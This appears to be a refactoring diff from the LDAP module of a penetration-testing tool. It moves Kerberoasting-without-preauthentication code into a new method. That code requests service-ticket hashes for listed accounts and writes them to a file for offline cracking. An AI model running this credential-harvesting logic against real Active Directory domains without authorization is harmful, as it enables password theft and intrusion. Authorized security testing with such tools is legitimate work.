@@ -965,42 +965,7 @@ class ldap(connection):
 
     def kerberoasting(self):
         if self.args.no_preauth_targets:
-            usernames = []
-            for item in self.args.no_preauth_targets:
-                if os.path.isfile(item):
-                    with open(item, encoding="utf-8") as f:
-                        usernames.extend(line.strip() for line in f if line.strip())
-                else:
-                    usernames.append(item.strip())
-
-            skipped = []
-            hashes = []
-
-            for spn in usernames:
-                base_name = spn.split("/", 1)[0].split("@", 1)[0].rstrip()
-
-                if base_name.lower() == "krbtgt" or base_name.endswith("$"):
-                    skipped.append(base_name)
-                    continue
-
-                if not self.username:
-                    self.logger.fail("Likely executed without password flag. Please run the command with -p ''")
-                    return
-                hashline = KerberosAttacks(self).get_tgs_no_preauth(self.username, spn)
-                if hashline:
-                    hashes.append(hashline)
-
-            if skipped:
-                self.logger.display(f"Skipping account: {', '.join(skipped)}")
-            if hashes:
-                self.logger.display(f"Total of records returned {len(hashes)}")
-            else:
-                self.logger.highlight("No entries found!")
-
-            for line in hashes:
-                self.logger.highlight(line)
-                with open(self.args.kerberoasting, "a+", encoding="utf-8") as f:
-                    f.write(line + "\n")
+            self.roast_no_preauth()
             return
 
         if self.args.targeted_kerberoast:
@@ -1199,6 +1164,44 @@ class ldap(connection):
                         self.logger.fail(f"Principal: {downLevelLogonName} - {e}")
                 else:
                     self.logger.fail(f"Error retrieving TGT for {self.domain}\\{self.username} from {self.kdcHost}")
+
+    def roast_no_preauth(self):
+        usernames = []
+        for item in self.args.no_preauth_targets:
+            if os.path.isfile(item):
+                with open(item, encoding="utf-8") as f:
+                    usernames.extend(line.strip() for line in f if line.strip())
+            else:
+                usernames.append(item.strip())
+
+        skipped = []
+        hashes = []
+
+        for spn in usernames:
+            base_name = spn.split("/", 1)[0].split("@", 1)[0].rstrip()
+
+            if base_name.lower() == "krbtgt" or base_name.endswith("$"):
+                skipped.append(base_name)
+                continue
+
+            if not self.username:
+                self.logger.fail("Likely executed without password flag. Please run the command with -p ''")
+                return
+            hashline = KerberosAttacks(self).get_tgs_no_preauth(self.username, spn)
+            if hashline:
+                hashes.append(hashline)
+
+        if skipped:
+            self.logger.display(f"Skipping account: {', '.join(skipped)}")
+        if hashes:
+            self.logger.display(f"Total of records returned {len(hashes)}")
+        else:
+            self.logger.highlight("No entries found!")
+
+        for line in hashes:
+            self.logger.highlight(line)
+            with open(self.args.kerberoasting, "a+", encoding="utf-8") as f:
+                f.write(line + "\n")
 
     def query(self):
         """
